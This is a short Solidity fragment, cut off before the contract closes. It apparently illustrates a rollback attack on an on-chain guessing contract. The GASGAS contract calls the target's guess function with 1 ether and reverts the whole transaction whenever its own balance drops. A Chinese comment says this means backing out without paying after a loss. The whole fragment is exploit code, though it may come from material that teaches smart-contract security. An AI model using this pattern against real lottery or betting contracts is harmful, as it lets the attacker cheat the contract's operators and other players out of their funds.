
contract GASGAS{
    function rollback(Alice alice, int8 num) public {
        uint256 balance1 = this.balance;
        bool isSucceed = address(alice).call.gas(10000).value(1 ether)(bytes4(keccak256("guess(int8)")), num);
        uint256 balance2 = this.balance;
        
        // 發現沒中, 反悔不付錢. 
        if(balance2 < balance1){
            revert();
        }
    }